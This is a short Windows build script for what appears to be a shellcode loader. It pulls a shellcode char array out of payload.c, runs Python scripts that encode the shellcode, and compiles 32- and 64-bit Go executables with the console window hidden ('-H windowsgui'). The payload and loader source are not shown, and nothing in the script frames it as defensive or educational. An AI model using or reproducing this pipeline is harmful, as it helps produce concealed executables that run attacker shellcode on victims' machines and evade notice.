type payload.c | findstr "char" >payload_char.c
python creat_a.py
python go_shellcode_encode.py
set goarch=386
go build -ldflags "-H windowsgui"  -o sell_32.exe main.go
set goarch=amd64
go build -ldflags "-H windowsgui"  -o sell_64.exe main.go

set CGO_ENABLED=1
set GOOS=windows
